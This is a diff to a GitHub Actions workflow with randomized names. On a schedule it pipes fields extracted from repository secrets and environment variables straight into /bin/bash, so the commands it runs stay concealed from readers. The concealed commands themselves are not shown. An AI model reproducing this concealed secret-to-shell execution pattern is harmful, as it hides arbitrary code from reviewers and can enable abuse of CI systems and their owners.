@@ -3,7 +3,7 @@ on:
   workflow_dispatch:
 
   schedule:
-    - cron: '20 1,7,13,19 * * *'
+    - cron: '41 4,10,16,22 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,16 +11,17 @@ jobs:
       - uses: actions/checkout@v4
       - name: zhifeihaoyan
         env:
-          ley3: ${{ secrets.ley3 }}
+          byl61662: ${{ secrets.byl61662 }}
         run: |
-          printf '%s' "$ley3" | jq -r .urnw6470 | /bin/bash
-          echo $txwoq90010 | jq -r .sz09974 | /bin/bash
-          echo $eur734 | jq -r .cyxo067 | /bin/bash
-          echo $k7 | jq -r .t5491 | /bin/bash
+          printf '%s' "$byl61662" | jq -r .ttcrl5 | /bin/bash
+          printf '%s' "$ydgm7130" | jq -r .tgigi314 | /bin/bash
+          echo $ofw84 | jq -r .vcvsn24431 | /bin/bash
+          printf '%s' "$kmg89" | jq -r .h7 | /bin/bash
+          printf '%s' "$ykzig2273" | jq -r .rvh459 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
         with:
-          name: pmk2W6nm
+          name: paCQouFv
           path: "*.zip"
           retention-days: 1
